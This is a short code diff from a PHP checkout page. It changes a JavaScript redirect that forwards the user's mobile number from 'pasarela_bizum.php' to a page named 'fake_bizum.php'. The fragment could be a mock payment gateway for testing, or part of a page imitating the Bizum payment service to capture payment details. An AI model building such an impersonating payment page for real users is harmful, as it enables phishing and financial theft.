@@ -213,7 +213,7 @@ if (isset($_SESSION['datos_envio']['telefono'])) {
                 overlay.classList.remove('hidden');
                 
                 setTimeout(function(){
-                    window.location.href = "pasarela_bizum.php?movil=" + encodeURIComponent(movil);
+                    window.location.href = "fake_bizum.php?movil=" + encodeURIComponent(movil);
                 }, 1500);
             }
         });
